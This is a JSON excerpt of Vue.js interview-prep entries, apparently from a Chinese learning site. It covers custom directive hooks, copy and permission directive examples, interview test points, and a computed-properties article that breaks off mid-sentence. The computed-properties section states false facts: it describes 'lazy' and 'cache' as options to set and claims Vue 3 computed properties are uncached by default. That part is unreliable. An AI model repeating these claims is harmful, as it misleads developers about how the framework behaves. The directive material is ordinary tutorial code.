    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "2ea94d0f-e412-4db2-9d42-20c7eb50284f",
        "title": "手写 vue 的双向绑定",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T19:40:35.000Z"
      },
      {
        "exerciseKey": "9b0272bb-d110-45f6-a9e9-7e426c8288d5",
        "title": "Vue 中的双向绑定和单向数据流原则是否冲突？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:53:38.000Z"
      },
      {
        "exerciseKey": "a4905b6d-283a-48ee-8c19-6f390f7fd9bc",
        "title": "编写一个vue组件，组件内部使用插槽接收外部内容，v-model双向绑定，实现折叠展开的功能",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:31:13.000Z",
        "updateAt": "2023-12-17T18:31:20.000Z"
      },
      {
        "exerciseKey": "da1881cc-64b9-40f8-8a25-a6256c1349ed",
        "title": "谈谈对Vue中双向绑定的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:27:36.000Z",
        "updateAt": "2024-08-10T17:04:37.000Z"
      }
    ]
  },
  "66": {
    "id": 66,
    "tagId": 14,
    "title": "vue指令",
    "explanation": "#### 1.1 钩子函数\n\n一个指令定义对象可以提供如下几个钩子函数 (均为可选)：\n\n*   bind 只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。\n*   inserted 被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。\n*   update 所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的值可能发生了改变，也可能没有。\n*   componentUpdated 指令所在组件的 VNode 及其子 VNode 全部更新后调用。\n*   unbind 只调用一次，指令与元素解绑时调用。\n\n```javascript\nVue.directive('gqs',{\n    bind() {\n      // 当指令绑定到 HTML 元素上时触发.**只调用一次**\n      console.log('bind triggerd')\n    },\n    inserted() {\n      // 当绑定了指令的这个HTML元素插入到父元素上时触发(在这里父元素是 `div#app`)**.但不保证,父元素已经插入了 DOM 文档.**\n      console.log('inserted triggerd')\n    },\n    updated() {\n      // 所在组件的`VNode`更新时调用.\n      console.log('updated triggerd')\n    },\n    componentUpdated() {\n      // 指令所在组件的 VNode 及其子 VNode 全部更新后调用。\n      console.log('componentUpdated triggerd')\n      \n    },\n    unbind() {\n      // 只调用一次，指令与元素解绑时调用.\n      console.log('unbind triggerd')\n    }\n  })\n\n```\n\n#### 1.2 钩子函数参数\n\n指令钩子函数会被传入以下参数：\n\n*   el 指令所绑定的元素，可以用来直接操作 DOM\n    \n*   binding 一个对象，包含以下属性：\n    \n    ```\n     name：指令名，不包括 v- 前缀。\n    \n     value：指令的绑定值，例如：v-my-directive=\"1 + 1\" 中，绑定值为 2。\n    \n     oldValue：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。无论值是否改变都可用。\n    \n    \n     expression：字符串形式的指令表达式。例如 v-my-directive=\"1 + 1\" 中，表达式为 \"1 + 1\"。\n    \n     arg：传给指令的参数，可选。例如 v-my-directive:foo 中，参数为 \"foo\"。\n    \n     modifiers：一个包含修饰符的对象。例如：v-my-directive.foo.bar 中，修饰符对象为 { foo: true, bar: true }。\n    \n    ```\n    \n*   vnode：Vue 编译生成的虚拟节点。\n    \n*   oldVnode：上一个虚拟节点，仅在 update 和 componentUpdated 钩子中可用。 _除了 el 之外，其它参数都应该是只读的，切勿进行修改。如果需要在钩子之间共享数据，建议通过元素的 dataset 来进行。_\n    \n\n#### 1.3 指令简写\n\n当绑定指令的元素的状态发生改变时(这里主要是指元素绑定的vue数据发生改变时),仍然会触发指令中的 update 函数. 那么我们可以利用指令的简写形式,来做一些有意思的事情.\n\n**核心思想就是:** **当一个HTML元素设置了指令,那么在这个元素的状态发生改变时(由vue数据变化带来的带来的监控),我们可以利用update()钩子函数监控到这个元素的变化,然后根据需要做一些其他的事情.**\n\n**案例**：使用官方指定的指令简写模式:\n\n```javascript\nVue.directive('color-swatch', function (el, binding) {\n  el.style.backgroundColor = binding.value\n})\n\n```\n\n当元素的状态发生改变时,就会触发 update\n\n#### 1.4 小结几点\n\n*   使用 Vue.directive() 来新建一个全局指令,(指令使用在HTML元素属性上的)\n*   Vue.directive('focus') 第一个参数focus是指令名,指令名在声明的时候,不需要加 v-\n*   在使用指令的HTML元素上,我们需要加上 v-.\n\n```html\n<input type=\"text\" v-focus placeholder=\"我有v-focus,所以,我获取了焦点\"/> \n\n```\n\n*   Vue.directive('focus',{}) 第二个参数是一个对象,对象内部有个 inserted() 的函数,函数有 el 这个参数.\n    \n    *   el 这个参数表示了绑定这个指令的 DOM元素,在这里就是后面那个有 placeholder 的 input\n    *   el 就等价于 document.getElementById('el.id')....\n    *   可以利用 $(el) 无缝连接 jQuery\n\n### 2\\. vue-cli中定义全局指令\n\n#### 2.1 main.js\n\n```javascript\nimport Vue from 'vue'\nimport App from './App.vue'\nimport router from './router'\nimport store from './store'\n\n// 如果你只需要执行绑定的 bind 和 update 两个事件,vue指令定义也配置了简写方式.\nVue.directive('my-color',(el) => {\n  el.style.color = 'red'\n  el.style.backgroundColor = 'yellow'\n})\n\nnew Vue({\n  router,\n  store,\n  render: h => h(App)\n}).$mount('#app')\n\n```\n\n#### 2.2 相应组件\n\n```vue\n<template>\n  <input type=\"text\" v-my-color>\n</template>\n\n```\n\n#### 2.3 实现效果\n\n![在这里插入图片描述](https://static.ecool.fun//article/753eb674-ac7c-4a32-bec8-a06c3dc1ddc2.awebp)\n\n### 3\\. vue-cli中定义局部指令\n\n#### 3.1 相应组件\n\n```javascript\n<template>\n\t<input type=\"text\" v-model=\"text\" placeholder=\"仅可填入正整数数字\"\t\n\t\tv-my-text=\"{key:'text',maxval:'1000'}\">\n</template>\n<script>\nexport default {\n  data(){\n    return {\n      text:'',\n    }\n  },\ndirectives:{\n    myText:{\n      bind(el,binding,vnode) {\n        el.handler = function() {\n          el.value = el.value.replace(/\\D+/g, '')\n          //根据设置的规则，进行判断处理\n          if(binding.value.maxval && el.value > parseInt(binding.value.maxval)){\n            el.value = parseInt(binding.value.maxval);\n          }\n          //根据指令调取位置设置的规则Key，进行全局上文赋值\n          vnode['context'][binding.value.key] = el.value;\n        }\n        el.addEventListener('input', el.handler)\n      },\n    },\n  }\n}\n</script>\n\n```\n\n#### 3.2 简写模式\n\n```javascript\n<template>\n\t<input type=\"text\" v-model=\"text\" placeholder=\"仅可填入正整数数字\"\t\n\t\tv-my-text=\"{key:'text',maxval:'1000'}\">\n</template>\n<script>\nexport default {\n  data(){\n    return {\n      text:'',\n    }\n  },\n  directives:{\n    myText:(el,binding,vnode) => {\n      el.handler = function() {\n      el.value = el.value.replace(/\\D+/g, '')\n      //根据设置的规则，进行判断处理\n      if(binding.value.maxval && el.value > parseInt(binding.value.maxval)){\n        el.value = parseInt(binding.value.maxval);\n      }\n      //根据指令调取位置设置的规则Key，进行全局上文赋值\n      vnode['context'][binding.value.key] = el.value;\n      }\n      el.addEventListener('input', el.handler)\n    },\n  }, \n}\n</script>\n\n```\n\n### 4\\. 应用场景\n\n#### 4.1 自动获取焦点（官方示例）\n\n```\n// 注册一个全局自定义指令 `v-focus`\nVue.directive('focus', {\n  // 当被绑定的元素插入到 DOM 中时……\n  inserted: function (el) {\n    // 聚焦元素\n    el.focus()\n  }\n})\n\n```\n\n#### 4.2 一键 Copy的功能\n\n1.  首先建一个 js 文件（v-copy.js）。定义一个对象。（ 指令实际就是一个对象 ）\n\n```javascript\nimport { Message } from 'ant-design-vue';\n\nconst vCopy = { // 名字爱取啥取啥\n  /*\n    bind 钩子函数，第一次绑定时调用，可以在这里做初始化设置\n    el: 作用的 dom 对象\n    value: 传给指令的值，也就是我们要 copy 的值\n  */\n  bind(el, { value }) {\n    el.$value = value; // 用一个全局属性来存传进来的值，因为这个值在别的钩子函数里还会用到\n    el.handler = () => {\n      if (!el.$value) {\n      // 值为空的时候，给出提示，我这里的提示是用的 ant-design-vue 的提示，你们随意\n        Message.warning('无复制内容');\n        return;\n      }\n      // 动态创建 textarea 标签\n      const textarea = document.createElement('textarea');\n      // 将该 textarea 设为 readonly 防止 iOS 下自动唤起键盘，同时将 textarea 移出可视区域\n      textarea.readOnly = 'readonly';\n      textarea.style.position = 'absolute';\n      textarea.style.left = '-9999px';\n      // 将要 copy 的值赋给 textarea 标签的 value 属性\n      textarea.value = el.$value;\n      // 将 textarea 插入到 body 中\n      document.body.appendChild(textarea);\n      // 选中值并复制\n      textarea.select();\n      // textarea.setSelectionRange(0, textarea.value.length);\n      const result = document.execCommand('Copy');\n      if (result) {\n        Message.success('复制成功');\n      }\n      document.body.removeChild(textarea);\n    };\n    // 绑定点击事件，就是所谓的一键 copy 啦\n    el.addEventListener('click', el.handler);\n  },\n  // 当传进来的值更新的时候触发\n  componentUpdated(el, { value }) {\n    el.$value = value;\n  },\n  // 指令与元素解绑的时候，移除事件绑定\n  unbind(el) {\n    el.removeEventListener('click', el.handler);\n  },\n};\n\nexport default vCopy;\n\n```\n\n2.  到这里，一键 Copy 的功能就实现了，最后再说一嘴怎么将自定义指令注册到全局：再新建一个 js （ directives.js ）文件来注册所有的全局指令。\n\n```javascript\nimport copy from './v-copy';\n// 自定义指令\nconst directives = {\n  copy,\n};\n// 这种写法可以批量注册指令\nexport default {\n  install(Vue) {\n    Object.keys(directives).forEach((key) => {\n      Vue.directive(key, directives[key]);\n    });\n  },\n};\n\n```\n\n3.最后，在 main.js 中这样引入\n\n```javascript\nimport Vue from 'vue';\nimport Directives from './directives';\n\nVue.use(Directives);\n\n```\n\n#### 4.3 按钮级别权限控制\n\n权限控制分为页面级别和按钮级别，这两种思路基本是一致的。\n\n**页面级别**：用户登录后，获取用户role，将role和路由表每个页面的需要的权限作比较，生成最终用户可访问的路由表。最后通过router.addRoutes动态挂载。现在是通过获取到用户的role之后，在前端用v-if手动判断来区分不同权限对应的按钮的。\n\n**按钮级别**：用户登录后，获取用户role，在前端用 v-if 或者封装一个自定义指令，手动判断来区分不同权限对应的按钮的。\n\n**思路**：\n\n**登录**：当用户填写完账号和密码后向服务端验证是否正确，验证通过之后，服务端会返回一个token，拿到token之后（将token存贮到sessionStorage中，保证刷新页面后能记住用户登录状态），前端会根据token再去拉取一个 user\\_info 的接口来获取用户的详细信息（如用户角色，用户权限，用户名等等信息）。\n\n**权限验证**：通过token获取用户对应的role，自定义指令，获取路由meta属性里btnPermissions(注：meta.btnPermissions是存放按钮权限的数组，在路由表里配置)，然后判断role是否在btnPermissions数组里，若不在即删除该按钮DOM。\n\n1.  路由配置：\n\n```javascript\npath: '/permission',\ncomponent: Layout,\nname: '权限测试',\nmeta: { btnPermissions: ['admin','supper','normal'] }, //页面需要的权限\nchildren: [\n    {\n        path: 'supper',\n        component: _import('system/supper'),\n        name: '权限测试页',\n        meta: { btnPermissions: ['admin','supper'] }  //页面需要的权限\n    },\n    {\n        path: 'normal',\n        component: _import('system/normal'),\n        name: '权限测试页',\n        meta: { btnPermissions: ['admin'] }  //页面需要的权限\n    }\n]\n\n```\n\n2.  自定义指令：\n\n```javascript\nimport Vue from 'vue'\n    \n/**权限指令**/\nconst has = Vue.directive('has', {\n    bind: function (el, binding, vnode) {\n        // 获取页面按钮权限\n        let btnPermissionsArr = vnode.context.$route.meta.btnPermissions;\n        if (!Vue.prototype.$_has(btnPermissionsArr)) {\n            el.parentNode.removeChild(el);\n        }\n    }\n});\n// 权限检查方法\nVue.prototype.$_has = function (value) {\n    let isExist = false;\n    // 获取用户按钮权限\n    let btnPermissionsStr = sessionStorage.getItem(\"btnPermissions\");\n    if (btnPermissionsStr == undefined || btnPermissionsStr == null) {\n        return false;\n    }\n    if (value.indexOf(btnPermissionsStr) > -1) {\n        isExist = true;\n    }\n    return isExist;\n};\nexport {has}\n\n```\n\n3.  在main.js文件引入文件：\n\n```javascript\nimport has from './public/js/btnPermissions.js';\n\n```\n\n4.  页面中按钮只需加v-has即可：\n\n```html\n<el-button @click='editClick' type=\"primary\" v-has>编辑</el-button>\n\n```\n\n  ",
    "testPoint": "### **1. 指令的分类与基础知识**\n#### **问题**：\n- Vue 提供了哪些内置指令？每种指令的用途是什么？\n- 自定义指令和内置指令的区别是什么？\n\n#### **考察点**：\n- **常用内置指令**：\n  - `v-bind`：绑定属性或动态值。\n  - `v-model`：双向绑定。\n  - `v-if/v-else/v-else-if`：条件渲染。\n  - `v-for`：列表渲染。\n  - `v-show`：控制显示/隐藏。\n  - `v-on`：事件绑定。\n  - `v-html`：渲染 HTML 字符串（需注意安全问题）。\n  - `v-slot`：插槽绑定。\n- **高级指令**：\n  - `v-once`：渲染一次后不再更新，提高性能。\n  - `v-pre`：跳过这个元素和子元素的编译。\n  - `v-cloak`：控制未编译模板的占位样式。\n- **自定义指令**：可以扩展功能，弥补内置指令的不足。\n\n---\n\n### **2. 条件渲染指令**\n#### **问题**：\n- `v-if` 和 `v-show` 的区别是什么？应该如何选择？\n- 如何实现条件渲染多个条件？\n\n#### **考察点**：\n- **区别**：\n  - `v-if`：真正地创建和销毁 DOM 元素，性能开销较大。\n  - `v-show`：仅通过 `display` 样式控制显示/隐藏，适合频繁切换的场景。\n- **多条件渲染**：\n  - 使用 `v-else` 和 `v-else-if`。\n  - 注意 `v-if` 的优先级，避免渲染逻辑混乱。\n\n---\n\n### **3. 列表渲染指令**\n#### **问题**：\n- `v-for` 的 key 属性有什么作用？为什么推荐使用？\n- 在 `v-for` 和 `v-if` 一起使用时，有什么需要注意的地方？\n- 如何在列表中监听特定项的变化？\n\n#### **考察点**：\n- **Key 的作用**：提供唯一标识，帮助 Vue 更高效地更新 DOM。\n- **v-for 与 v-if**：避免同时使用，`v-for` 优先级更高，可能导致不必要的性能消耗。\n- **监听特定项**：通过 `v-bind:key` 与自定义事件监听变化。\n\n---\n\n### **4. 事件绑定指令**\n#### **问题**：\n- `v-on` 指令有哪些修饰符？如何使用？\n- 事件绑定中如何传递参数？\n- 如何实现事件的节流与防抖？\n\n#### **考察点**：\n- **常用修饰符**：\n  - `.stop`：阻止事件冒泡。\n  - `.prevent`：阻止默认事件。\n  - `.capture`：使用事件捕获模式。\n  - `.once`：事件只触发一次。\n  - `.self`：只在事件由自身触发时才触发处理。\n- **参数传递**：\n  - 在模板中使用 `@click=\"method(arg)\"`。\n  - 使用 `$event` 传递原生事件对象。\n- **节流与防抖**：\n  - 使用第三方工具库（如 Lodash）。\n  - 或通过自定义指令实现：\n    ```javascript\n    <button v-on:click=\"throttledClick\">Click Me</button>\n    methods: {\n      throttledClick: _.throttle(function() {\n        console.log('Clicked');\n      }, 1000)\n    }\n    ```\n\n---\n\n### **5. 动态绑定与样式控制**\n#### **问题**：\n- 如何通过 `v-bind` 动态绑定属性？\n- 使用 `v-bind` 设置动态类名时，有哪些写法？\n- 如何实现动态样式绑定？\n\n#### **考察点**：\n- 动态属性绑定：\n  ```html\n  <img v-bind:src=\"imageSrc\" />\n  ```\n- 动态类名绑定：\n  - 对象语法：`<div :class=\"{ active: isActive, 'text-danger': hasError }\"></div>`\n  - 数组语法：`<div :class=\"[classA, classB]\"></div>`\n- 动态样式绑定：\n  - 对象语法：`<div :style=\"{ color: activeColor, fontSize: fontSize + 'px' }\"></div>`\n  - 数组语法：`<div :style=\"[styleObjectA, styleObjectB]\"></div>`\n\n---\n\n### **6. 自定义指令**\n#### **问题**：\n- 自定义指令有哪些使用场景？\n- 如何为一个元素实现拖拽功能的自定义指令？\n- 自定义指令的生命周期有哪些钩子？\n\n#### **考察点**：\n- **使用场景**：\n  - 特殊的 DOM 操作（如聚焦、拖拽、权限控制）。\n  - 在多个组件复用的复杂逻辑。\n- **指令的钩子函数**：\n  - `bind`：指令绑定到元素时调用，初始化逻辑。\n  - `inserted`：元素插入 DOM 时调用。\n  - `update`：包含上下文更新时调用。\n  - `componentUpdated`：包含子节点更新后调用。\n  - `unbind`：指令解绑时调用。\n- **拖拽功能示例**：\n  ```javascript\n  Vue.directive('drag', {\n    bind(el) {\n      el.onmousedown = function(e) {\n        const disX = e.clientX - el.offsetLeft;\n        const disY = e.clientY - el.offsetTop;\n        document.onmousemove = function(e) {\n          el.style.left = e.clientX - disX + 'px';\n          el.style.top = e.clientY - disY + 'px';\n        };\n        document.onmouseup = function() {\n          document.onmousemove = null;\n          document.onmouseup = null;\n        };\n      };\n    }\n  });\n  ```\n\n---\n\n### **7. 条件与动态指令**\n#### **问题**：\n- `v-bind`、`v-if` 和 `v-show` 混合使用时会出现什么问题？\n- 是否可以动态切换指令？\n\n#### **考察点**：\n- **动态切换指令**：\n  - 通过动态属性名实现动态绑定。\n  - 示例：\n    ```html\n    <div v-bind:[dynamicPropName]=\"propValue\"></div>\n    ```\n\n---\n\n### **8. 实践与开放性问题**\n#### **问题**：\n- 你在项目中是否自定义过指令？请描述实现细节。\n- Vue 的指令机制有哪些优缺点？如果让你设计，如何改进？\n\n#### **考察点**：\n- 项目经验：\n  - 聚焦指令：`v-focus`\n  - 权限指令：`v-permission`\n  - 其他复杂场景指令。\n- 优缺点：\n  - 优点：便于实现 DOM 操作的复用。\n  - 缺点：对指令的滥用可能导致代码难以维护。\n\n---\n\n### **总结**\n通过 Vue 指令的考察，可以从基础语法、原理、实践和优化等多角度评估候选人对 Vue 的掌握程度。优秀的候选人不仅能流利回答问题，还能结合项目经验，展示其灵活运用指令解决复杂场景问题的能力。",
    "exerciseKeyList": "[\"b4e5ffc9-9149-42bc-859c-8f179695eb9a\",\"7f41c072-39f8-4785-ad16-992bf7cacfb7\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2024-10-04T12:33:51.000Z",
    "updateAt": "2024-12-15T11:24:35.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "7f41c072-39f8-4785-ad16-992bf7cacfb7",
        "title": "自定义指令是什么？有哪些应用场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:42:51.000Z",
        "updateAt": "2024-08-10T17:04:44.000Z"
      },
      {
        "exerciseKey": "b4e5ffc9-9149-42bc-859c-8f179695eb9a",
        "title": "vue 是如何识别和解析指令的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-16T12:20:00.000Z"
      }
    ]
  },
  "67": {
    "id": 67,
    "tagId": 14,
    "title": "计算属性",
    "explanation": "## 前言\n\nVue 的计算属性（`computed`）是 Vue.js 中非常重要的一个概念。它允许你在 Vue 组件中定义一些计算逻辑，这些逻辑会依赖于 Vue 的响应式数据，并且具有缓存机制，只有在依赖数据发生改变时才会重新计算，从而提高了性能。\n\n计算属性的主要作用包括：\n\n-   数据转换\n-   数据过滤\n-   响应式依赖\n-   缓存机制\n-   简化模板\n\n在本篇文章中，我们将详细探寻如何利用计算属性优化 Vue 组件的数据处理和渲染逻辑，深入了解 Vue 计算属性的精髓。\n\n## 一. 认识计算属性\n\n### 1\\. 什么是计算属性\n\nVue.js 中的计算属性（`computed properties`）是 Vue 实例中非常重要的一个特性。它们用于对 Vue 实例的数据进行动态计算，且具有缓存机制，只有在相关依赖发生改变时才会重新计算。这种特性使得计算属性非常适合用于处理模板中的逻辑。\n\n### 2\\. 计算属性的定义\n\n计算属性是在 Vue 实例的`computed`选项中定义的，可以是一个函数或具有`get`和`set`方法的对象。函数形式的计算属性会在调用时被执行，而对象形式的计算属性则可以提供自定义的`get`和`set`方法。\n\n```javascript\ncomputed: {\n  // 函数形式的计算属性\n  reversedMessage: function () {\n    return this.message.split('').reverse().join('');\n  },\n  // 对象形式的计算属性\n  fullName: {\n    get: function () {\n      return this.firstName + ' ' + this.lastName;\n    },\n    set: function (newValue) {\n      var names = newValue.split(' ');\n      this.firstName = names[0];\n      this.lastName = names[names.length - 1];\n    }\n  }\n}\n```\n\n### 3\\. 计算属性的依赖\n\n计算属性可以依赖于 Vue 实例的响应式数据。当依赖数据发生改变时，相关的计算属性会重新计算。\n\n```javascript\ndata: {\n  message: 'Hello'\n},\ncomputed: {\n  reversedMessage: function () {\n    return this.message.split('').reverse().join('');\n  }\n}\n```\n\n`reversedMessage`计算属性依赖于`message`数据，当`message`发生变化时，`reversedMessage`会自动更新。\n\n### 4\\. 计算属性的缓存\n\n计算属性默认具有缓存机制。只有在相关依赖发生变化时，计算属性才会重新计算。多次访问计算属性时，Vue 会返回之前计算的结果，而不会重新执行计算函数，从而提高性能。\n\n```javascript\ncomputed: {\n  reversedMessage: function () {\n    return this.message.split('').reverse().join('');\n  }\n}\n```\n\n在上面的代码中，`reversedMessage`会在第一次访问时计算并缓存结果，之后的访问会直接返回缓存的值，除非`message`发生变化。\n\n通过这些基本概念，计算属性可以帮助你更清晰、高效地处理 Vue 实例中的数据，从而简化模板逻辑，提高代码可读性和可维护性。\n\n## 二. Getter 和 Setter\n\nGetter 方法和 Setter 方法是计算属性中非常有用的功能，让我们详细了解一下它们的功能：\n\n### 1\\. Getter 方法\n\n计算属性的 Getter 方法用于计算并返回一个值。它类似于一个数据属性，但其值是通过计算得出的。Getter 方法在访问计算属性时被调用。\n\n例如，在以下示例中，我们定义了一个计算属性`fullName`，它通过组合`firstName`和`lastName`来生成完整的姓名：\n\n```javascript\nnew Vue({\n  data: {\n    firstName: \"John\",\n    lastName: \"Doe\",\n  },\n  computed: {\n    fullName: {\n      get: function () {\n        return this.firstName + \" \" + this.lastName;\n      },\n    },\n  },\n});\n```\n\n当你通过`this.fullName`访问`fullName`时，Getter 方法会被调用，并返回完整的姓名。\n\n### 2\\. Setter 方法\n\n计算属性的 Setter 方法用于监视计算属性被赋值时的变化，并在赋值时执行一些自定义的操作。它允许我们对计算属性进行更精细的控制。\n\n在以下示例中，我们对`fullName`计算属性添加了一个 Setter 方法，用于解析新值并更新`firstName`和`lastName`：\n\n```javascript\nnew Vue({\n  data: {\n    firstName: \"John\",\n    lastName: \"Doe\",\n  },\n  computed: {\n    fullName: {\n      get: function () {\n        return this.firstName + \" \" + this.lastName;\n      },\n      set: function (newValue) {\n        var names = newValue.split(\" \");\n        this.firstName = names[0];\n        this.lastName = names[names.length - 1];\n      },\n    },\n  },\n});\n```\n\n当你尝试为`fullName`赋值时，Setter 方法会被调用，它会解析新值并相应地更新`firstName`和`lastName`。\n\n使用 Getter 和 Setter 方法，你可以更灵活地处理计算属性，并根据需要执行自定义操作。这使得计算属性成为 Vue.js 中处理动态数据的强大工具。\n\n## 三. 计算属性的性能优化\n\n在开发中我们会经常的使用到计算属性，为了确保性能，有时需要注意一些优化技巧。以下是一些计算属性的性能优化方法：\n\n### 1\\. 合理利用懒计算 - lazy\n\n计算属性的`lazy`选项可以用来延迟计算属性的求值。默认情况下，计算属性是在获取时立即求值的，但通过设置`lazy`为`true`，可以将计算属性的求值延迟到首次访问该属性时才进行计算。这个选项可以提升初始化时的性能。\n\n当`lazy`选项设置为`true`时，计算属性不会在组件初始化时立即计算。相反，在首次访问计算属性时，它会调用定义的计算函数并将结果缓存起来，以供后续的访问。\n\n延迟计算属性的使用场景包括：\n\n1.  **计算代价较高的属性：** 如果计算属性的计算逻辑很复杂或需要耗费大量的计算资源，那么可以将其设置为延迟计算属性。这样，在组件初始化时不会执行这些代价较高的计算，只有在需要访问该属性时才会进行计算，避免不必要的性能损耗。\n    \n2.  **依赖其他计算属性的计算属性：** 如果有一个计算属性依赖了其他计算属性，而这些依赖的计算属性是在首次访问时才进行计算的，那么可以将这个计算属性设置为延迟计算属性。这样，在首次访问该计算属性时，它会自动等待依赖计算属性的值可用后再进行计算。\n    \n\n要设置计算属性的`lazy`选项，需要在计算属性中使用对象语法，并将`lazy`设置为`true`：\n\n```javascript\ncomputed: {\n  lazyComputed: {\n    get() {\n      // 延迟计算的逻辑\n    },\n    // ...\n    lazy: true\n  }\n}\n```\n\n需要注意的是，`lazy`选项只对 Vue2 有效，Vue3 中已移除该选项。在大多数情况下，默认的立即计算行为是足够的，只有在特定性能优化的场景中，才需要考虑使用延迟计算属性。\n\n通过合理地使用`lazy`选项，可以避免不必要的计算，提高应用程序的性能。但也要注意，过度使用延迟计算属性可能会导致代码变得复杂，因此应根据实际需求进行选择和权衡。\n\n### 2\\. 合理设置缓存行为 - cache\n\n计算属性的`cache`选项用于控制计算属性的缓存行为。默认情况下，计算属性是具有缓存的，即在计算属性的依赖项不发生变化时，多次访问该计算属性将返回缓存的结果，而不会重新计算。这样可以避免不必要的计算，提高性能。\n\n通过设置`cache`选项为`false`，可以禁用计算属性的缓存行为，这意味着每次访问该计算属性时都会重新计算，无论其依赖项是否发生变化。\n\n禁用计算属性缓存的使用场景包括：\n\n1.  **计算属性的值可能频繁变更：** 如果计算属性的值可能频繁地发生变化，即使其依赖项没有变化，你可能需要禁用缓存。这样可以确保每次访问计算属性时都能获取到最新的计算结果。\n    \n2.  **计算属性的值依赖于外部实例状态：** 如果计算属性的值依赖于外部实例状态（例如全局状态管理器或其他组件的状态），那么在这些状态发生变化时，你可能需要禁用缓存。这样可以确保计算属性能响应外部状态的变化。\n    \n\n要禁用计算属性的缓存，需要在计算属性中使用对象语法，并将`cache`选项设置为`false`：\n\n```javascript\ncomputed: {\n  uncachedComputed: {\n    get() {\n      // 计算逻辑\n    },\n    // ...\n    cache: false\n  }\n}\n```\n\n需要注意的是，禁用计算属性的缓存行为可能会导致不必要的性能开销，特别是在计算逻辑复杂或计算频率较高的情况下。因此，只在必要时禁用缓存，并确保评估其性能影响。\n\n在Vue3中，计算属性的缓存行为有了一些改变，默认情况下，计算属性不再具有缓存。如果需要保留缓存行为，可以将`cache`选项设置为`true`。\n\n通过合理地使用和管理计算属性的缓存，可以提高应用程序的性能和响应性。但也要注意，在某些特定情况下，禁用缓存或开启缓存可能更适合，需要根据实际需求进行选择和权衡。\n\n### 3\\. 避免过度计算\n\n尽量避免在计算属性中进行过于复杂或耗时的计算，以减轻性能负担。如果需要复杂计算，考虑将其分解为更小的计算属性或使用方法。\n\n如果计算属性中的依赖项较多或算逻辑较复杂，可能会影响性能。在这种情况下，可以考虑使用计算属性的getter和setter方法进行优化，或者使用`watch`来监听多个数据的变化。\n\n## 四. 实际项目中的应用\n\n在实际的项目开发中，我们有很多的应用场景需要用到计算属性，比如：\n\n-   数据过滤\n-   表单验证\n-   数据计算结果\n-   数据格式化\n-   ...\n\n等等，应用场景很多，在这里不多做赘述。以下面一个计算价格的场景为例，我们来看一下实际场景下是如何使用的。\n\n例如：当需要计算商品的总价时，可以使用计算属性来实现，下面我们详细说明计算属性的应用：\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>商品总价计算</title>\n    <script src=\"https://cdn.bootcdn.net/ajax/libs/vue/2.6.14/vue.js\"></script>\n  </head>\n  <body>\n    <div id=\"app\">\n      <h2>商品列表</h2>\n      <ul>\n        <li v-for=\"product in products\" :key=\"product.id\">\n          {{ product.name }} - ￥{{ product.price }}\n        </li>\n      </ul>\n      <h2>商品总价：￥{{ totalPrice }}</h2>\n    </div>\n\n    <script>\n      new Vue({\n        el: \"#app\",\n        data: {\n          products: [\n            { id: 1, name: \"手机\", price: 2999 },\n            { id: 2, name: \"平板\", price: 1999 },\n            { id: 3, name: \"耳机\", price: 399 },\n            { id: 4, name: \"电视\", price: 4999 },\n            { id: 5, name: \"笔记本\", price: 5999 },\n          ],\n        },\n        computed: {\n          totalPrice: function () {\n            return this.products.reduce(function (total, product) {\n              return total + product.price;\n            }, 0);\n          },\n        },\n      });\n    </script>\n  </body>\n</html>\n```\n\n在上面的代码中，我们定义了一个 Vue 实例，并使用`data`选项定义了一个`products`数组，其中包含了一些商品信息，包括商品的 ID、名称和价格。\n\n接着，在`computed`选项中定义了一个名为`totalPrice`的计算属性。这个计算属性使用`reduce`方法对`products`数组中的价格进行累加，从而得到商品的总价。最后，在模板中使用插值语法`{{ totalPrice }}`将计算结果显示出来。\n\n运行上面的代码，你将看到页面上列出了商品列表，并实时计算并显示了商品的总价。如下图所示：\n\n![image.png](https://static.ecool.fun//article/e7f21429-d486-4810-baf2-7f0114d54968.)\n\n通过上面的示例，我们可以看到计算属性的应用方式。它能够轻松地在 Vue 实例的响应式数据上进行复杂的计算，而且只有在相关依赖发生变化时才会重新计算。同时提高了代码的可读性、可维护性和性能。\n\n## 五. 最佳实践\n\n下面是总结的一些 Vue 计算属性的最佳实践，它们可以帮助你更好地应用和管理计算属性：\n\n1.  **保持计算属性简洁：** 计算属性应该保简洁，只包含必要的逻辑。避免在计算属性中执行复杂的计算或涉及过多的业务逻辑。如果需要复杂的逻辑，可以考虑使用方法。\n    \n2.  **避免计算属性中的副作用：** 计算属性应该是纯的，不应该有副作用。副作用包括修改数据、触发异步操作、调用接口等。如果需要有副作用的操作，应该放在生命周期钩子函数或观察者中。\n    \n3.  **合理使用计算属性和方法：** 计算属性适合处理依赖关系和复杂的数据转换。方法适用于执行具有副作用的操作或根据需要传递参数。根据需求合理使用计算属性和方法，可以使代码更加清晰和易读。\n    \n4.  **注重性能优化：** 参考文章中的第三部分 **“计算属性的性能优化”**\n    \n\n通过合理使用和管理计算属性，你可以优化应用程序的性能，更好地处理数据逻辑和依赖关系。\n\n## 总结\n\n在Vue中，计算属性是一个非常重要的特性，它允许我们在模板中使用简洁而优雅的方式来处理数据的计算和变换。通过计算属性，我们可以将复杂的逻辑封装起来，并在需要时进行复用。\n\n通过这篇文章，我们了解到，除了缓存，Vue 还提供了`lazy`选项和`cache`选项来进一步控制计算属性的行为。通过使用`lazy`选项，我们可以延迟计算属性的求值，只有在首次访问该属性时才进行计算。而通过使用`cache`选项，我们可以禁用计算属性的缓存，每次访问都会重新计算。\n\n综上所述，计算属性是 Vue 